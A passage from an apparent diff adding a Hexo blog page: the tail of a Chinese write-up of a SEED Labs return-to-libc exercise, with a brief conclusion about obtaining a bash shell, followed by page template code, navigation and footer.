+  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看见执行了10次foo，返回bash。</p>
+<p><img src="/2025/11/04/seedlab2/image-20251030114455543.png" alt="image-20251030114455543"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次实验让我理解了retlib的基本原理，在关闭保护机制之后，整体实验不难。关键理解：如何构造字符串？可以通过环境变量，也可以通过自己输入。</p>
+
+  </div>
+  <div id=""></div>
+</div>
+
+<script>
+  
+Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
+  dragToClose: true,
+  Toolbar: true,
+  closeButton: "top",
+  Image: {
+    zoom: true,
+  },
+  on: {
+    initCarousel: (fancybox) => {
+      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+    "Carousel.change": (fancybox, carousel, to, from) => {
+      const slide = carousel.slides[to];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+  },
+});
+</script>
+
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 9999;
+        /* width: 600px !important; */
+        min-width: 0%;
+        max-width: 90%;
+        max-height: 80%;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            max-width: 88%
+        }
+    }
+</style>
+
+    <div class="post-paging">
+    
+
+    
+    <a href="/2025/11/03/seedlab1/">
+        <div class="post-paging-next">
+            <span>下一篇</span>
+            <p>Buffer Overflow Attack Lab(Server Version)</p>
+        </div>
+    </a>
+    
+</div>
+</div>
+		
+<div class="footer">
+	<div class="Copyright">
+		©2025 By Ram. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/79e/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/RamBree">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
+
+<script src="/js/gotop.js"></script>
+
+
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            transition: border .5s;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
+
+
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 20px;
+            height: 20px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $( '#js-go_top' )
+	.gotoTop( {
+		offset: 500,
+		speed: 300,
+		animationShow: {
+			'transform': 'translate(0,0)',
+			'transition': 'transform .5s ease-in-out'
+		},
+		animationHide: {
+			'transform': 'translate(100px,0)',
+			'transition': 'transform .5s ease-in-out'
+		}
+	} );
+</script>
+
+
+    <!-- Gitalk -->
+    <script>
+        const data = '{"clientID":"02b3c","clientSecret":"adfc7b4","repo":"gimment","owner":"duneng","admin":"duneng"}'
+        const gitalk = new Gitalk({
+            ...JSON.parse( data),
+            id:location.pathname,
+            distractionFreeMode:false
+        })
+        
+        if(Boolean('false')){
+            gitalk.render('gitalk-container')
+        }
+    </script>
+
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/79e/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
+</html>
+
